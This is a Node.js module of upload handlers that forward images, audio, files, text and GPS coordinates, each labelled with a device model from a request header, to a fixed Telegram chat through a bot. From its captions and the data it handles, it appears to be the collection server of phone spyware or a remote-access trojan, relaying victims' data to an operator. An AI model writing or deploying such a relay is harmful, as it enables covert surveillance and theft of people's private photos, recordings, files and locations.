const { appBot, id } = require('./telegramBotConfig');

function handleUploadImage(req, res) {
    const name = req.file.originalname;
    appBot.sendPhoto(id, req.file.buffer, {
        caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        parse_mode: "HTML"
    }, {
        contentType: 'image/*',
        filename: name
    });
    res.send('');
}

function handleUploadAudio(req, res) {
    const name = req.file.originalname;
    appBot.sendAudio(id, req.file.buffer, {
        caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        parse_mode: "HTML"
    }, {
        contentType: 'audio/*',
        filename: name
    });
    res.send('');
}

function handleUploadFile(req, res) {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: 'application/txt',
    });
    res.send('');
}

function handleUploadText(req, res) {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
}

function handleUploadLocation(req, res) {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { parse_mode: "HTML" });
    res.send('');
}

module.exports = { handleUploadImage, handleUploadAudio, handleUploadFile, handleUploadText, handleUploadLocation };
